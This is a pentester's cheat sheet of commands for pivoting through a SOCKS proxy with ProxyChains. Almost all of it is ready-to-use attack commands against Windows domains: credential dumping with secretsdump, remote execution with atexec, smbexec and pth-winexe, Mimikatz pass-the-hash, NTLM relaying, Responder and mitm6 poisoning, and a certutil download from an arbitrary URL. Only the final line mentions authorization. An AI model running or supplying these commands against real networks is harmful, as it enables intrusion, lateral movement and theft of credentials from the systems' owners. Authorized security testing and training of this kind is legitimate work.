**Pentest Note: Using ProxyChains for Pivoting**

---

### Using ProxyChains with Various Tools

**Lookup SID with ProxyChains:**

- **Command:**
  ```bash
  proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids
  ```

**Connect to MSSQL with ProxyChains:**

- **Command:**
  ```bash
  proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass
  ```

**Dump Secrets with ProxyChains:**

- **Command:**
  ```bash
  proxychains secretsdump.py -no-pass '<domain>/<user>'@'<ip>'
  ```

**Pseudo-Shell (File Write and Read) with ProxyChains:**

1. **ATExec:**
   ```bash
   proxychains atexec.py -no-pass <domain>/<user>@<ip> "command"
   ```

2. **SMBExec:**
   ```bash
   proxychains smbexec.py -no-pass <domain>/<user>@<ip>
   ```

**SMB Client with ProxyChains:**

- **Command:**
  ```bash
  proxychains smbclient.py -no-pass <user>@<ip>
  ```

  - **Search Files:**
    ```plaintext
    # Use smbclient interactive shell to search files
    ```

### Other Common Tools Used Through ProxyChains

#### SMB Tools:

**CrackMapExec:**

- **Command:**
  ```bash
  proxychains crackmapexec smb <target_ip> -u <user> -p <password>
  proxychains crackmapexec smb <target_ip> -u <user> -H <hash>
  ```

**SMBMap:**

- **Command:**
  ```bash
  proxychains smbmap -H <target_ip> -u <user> -p <password>
  ```

**SharpShares:**

- **Command:**
  ```bash
  proxychains SharpShares.exe -u <user> -p <password> -f <target_ip>
  ```

#### Certificate Tools:

**Certipy:**

- **Command:**
  ```bash
  proxychains certipy auth -pfx <crt_file> -dc-ip <dc_ip>
  ```

**Certutil:**

- **Command:**
  ```bash
  proxychains certutil -urlcache -split -f <url> <output_file>
  ```

#### Web Tools:

**Nikto:**

- **Command:**
  ```bash
  proxychains nikto -h <target_url>
  ```

**Burp Suite:**

- **Setup:**
  1. Configure Burp Suite to use the SOCKS proxy (127.0.0.1:1080).
  2. Use ProxyChains to tunnel Burp Suite traffic:
     ```bash
     proxychains burpsuite
     ```

**WFuzz:**

- **Command:**
  ```bash
  proxychains wfuzz -c -z file,wordlist.txt -u http://<target_url>/FUZZ
  ```

**EyeWitness:**

- **Command:**
  ```bash
  proxychains eyewitness -f urls.txt --web
  ```

#### Relay Tools:

**NTLMRelayx:**

- **Command:**
  ```bash
  proxychains ntlmrelayx.py -t smb://<target_ip>
  ```

**MultiRelay:**

- **Command:**
  ```bash
  proxychains multi-relay.py -t <target_ip>
  ```

#### Pass-the-Hash (PtH) Tools:

**Mimikatz:**

- **Command:**
  ```plaintext
  proxychains mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:<command>"
  ```

**pth-winexe:**

- **Command:**
  ```bash
  proxychains pth-winexe -U <user>%<hash> //<target_ip> <command>
  ```

#### Network Tools:

**Nmap:**

- **Command:**
  ```bash
  proxychains nmap -sT -Pn -p 445 <target_ip>
  ```

**Responder:**

- **Command:**
  ```bash
  proxychains responder -I <interface>
  ```

**MITM6:**

- **Command:**
  ```bash
  proxychains mitm6 -d <domain>
  ```

**Masscan:**

- **Command:**
  ```bash
  proxychains masscan -p1-65535 <target_ip> --rate=1000
  ```

### Summary

Using ProxyChains allows you to tunnel various tools through a SOCKS proxy, enabling secure and stealthy communication with remote systems. These tools include SMB tools, certificate tools, web tools, relay tools, Pass-the-Hash tools, and network tools, making ProxyChains a versatile tool in a pentester's arsenal. Always ensure your activities are authorized and comply with legal and ethical guidelines.